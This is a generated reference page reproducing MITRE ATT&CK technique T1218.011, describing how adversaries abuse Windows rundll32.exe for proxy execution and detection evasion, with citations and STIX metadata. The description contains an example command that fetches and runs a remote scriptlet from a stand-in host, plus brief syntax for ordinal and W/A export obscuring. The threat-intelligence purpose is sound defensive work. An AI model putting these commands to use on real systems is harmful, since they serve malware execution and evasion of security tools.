---
parsed_by: focuslocust
source: mitre
type: generated
---
# Rundll32

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `mitre` |
| Type | `technique` |
| Record ID | `T1218.011` |
| Source file | `` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [Rundll32](../../attack/techniques/T1218.011-rundll32.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | T1218.011 |
| name | Rundll32 |
| type | technique |
| source | mitre |
| url | https://attack.mitre.org/techniques/T1218/011 |

## Preserved Source Material

```yaml
created: '2020-01-23T18:03:46.248Z'
created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
description: 'Adversaries may abuse rundll32.exe to proxy execution of malicious code. Using rundll32.exe, vice executing
  directly (i.e. [Shared Modules](https://attack.mitre.org/techniques/T1129)), may avoid triggering security tools that may
  not monitor execution of the rundll32.exe process because of allowlists or false positives from normal operations. Rundll32.exe
  is commonly associated with executing DLL payloads (ex: <code>rundll32.exe {DLLname, DLLfunction}</code>).


  Rundll32.exe can also be used to execute [Control Panel](https://attack.mitre.org/techniques/T1218/002) Item files (.cpl)
  through the undocumented shell32.dll functions <code>Control_RunDLL</code> and <code>Control_RunDLLAsUser</code>. Double-clicking
  a .cpl file also causes rundll32.exe to execute.(Citation: Trend Micro CPL) For example, [ClickOnce](https://attack.mitre.org/techniques/T1127/002)
  can be proxied through Rundll32.exe.


  Rundll32 can also be used to execute scripts such as JavaScript. This can be done using a syntax similar to this: <code>rundll32.exe
  javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:https[:]//www[.]example[.]com/malicious.sct")"</code>  This
  behavior has been seen used by malware such as Poweliks.(Citation: This is Security Command Line Confusion)


  Threat actors may also abuse legitimate, signed system DLLs (e.g., <code>zipfldr.dll, ieframe.dll</code>) with <code>rundll32.exe</code>
  to execute malicious programs or scripts indirectly, making their activity appear more legitimate and evading detection.(Citation:
  lolbas project Zipfldr.dll)(Citation: lolbas project Ieframe.dll)


  Adversaries may also attempt to obscure malicious code from analysis by abusing the manner in which rundll32.exe loads DLL
  function names. As part of Windows compatibility support for various character sets, rundll32.exe will first check for wide/Unicode
  then ANSI character-supported functions before loading the specified function (e.g., given the command <code>rundll32.exe
  ExampleDLL.dll, ExampleFunction</code>, rundll32.exe would first attempt to execute <code>ExampleFunctionW</code>, or failing
  that <code>ExampleFunctionA</code>, before loading <code>ExampleFunction</code>). Adversaries may therefore obscure malicious
  code by creating multiple identical exported function names and appending <code>W</code> and/or <code>A</code> to harmless
  ones.(Citation: Attackify Rundll32.exe Obscurity)(Citation: Github NoRunDll) DLL functions can also be exported and executed
  by an ordinal number (ex: <code>rundll32.exe file.dll,#1</code>).


  Additionally, adversaries may use [Masquerading](https://attack.mitre.org/techniques/T1036) techniques (such as changing
  DLL file names, file extensions, or function names) to further conceal execution of a malicious payload.(Citation: rundll32.exe
  defense evasion) '
external_references:
- external_id: T1218.011
  source_name: mitre-attack
  url: https://attack.mitre.org/techniques/T1218/011
- description: Ariel silver. (2022, February 1). Defense Evasion Techniques. Retrieved April 8, 2022.
  source_name: rundll32.exe defense evasion
  url: https://www.cynet.com/attack-techniques-hands-on/defense-evasion-techniques/
- description: Attackify. (n.d.). Rundll32.exe Obscurity. Retrieved August 23, 2021.
  source_name: Attackify Rundll32.exe Obscurity
  url: https://www.attackify.com/blog/rundll32_execution_order/
- description: B. Ancel. (2014, August 20). Poweliks – Command Line Confusion. Retrieved March 5, 2018.
  source_name: This is Security Command Line Confusion
  url: https://www.stormshield.com/news/poweliks-command-line-confusion/
- description: gtworek. (2019, December 17). NoRunDll. Retrieved August 23, 2021.
  source_name: Github NoRunDll
  url: https://github.com/gtworek/PSBits/tree/master/NoRunDll
- description: lolbas project. (n.d.). Ieframe.dll. Retrieved October 5, 2025.
  source_name: lolbas project Ieframe.dll
  url: https://lolbas-project.github.io/lolbas/Libraries/Ieframe/
- description: lolbas project. (n.d.). Zipfldr.dll. Retrieved October 5, 2025.
  source_name: lolbas project Zipfldr.dll
  url: https://lolbas-project.github.io/lolbas/Libraries/Zipfldr/
- description: Merces, F. (2014). CPL Malware Malicious Control Panel Items. Retrieved November 1, 2017.
  source_name: Trend Micro CPL
  url: https://www.trendmicro.de/cloud-content/us/pdfs/security-intelligence/white-papers/wp-cpl-malware.pdf
id: attack-pattern--045d0922-2310-4e60-b5e4-3302302cb3c5
kill_chain_phases:
- kill_chain_name: mitre-attack
  phase_name: stealth
modified: '2026-04-15T22:42:03.135Z'
name: Rundll32
object_marking_refs:
- marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
revoked: false
spec_version: '2.1'
type: attack-pattern
x_mitre_attack_spec_version: 3.3.0
x_mitre_contributors:
- Amir Hossein Vafifar
- Casey Smith
- Gareth Phillips, Seek Ltd.
- James_inthe_box, Me
- Ricardo Dias
x_mitre_deprecated: false
x_mitre_domains:
- enterprise-attack
x_mitre_is_subtechnique: true
x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
x_mitre_platforms:
- Windows
x_mitre_version: '3.0'
```
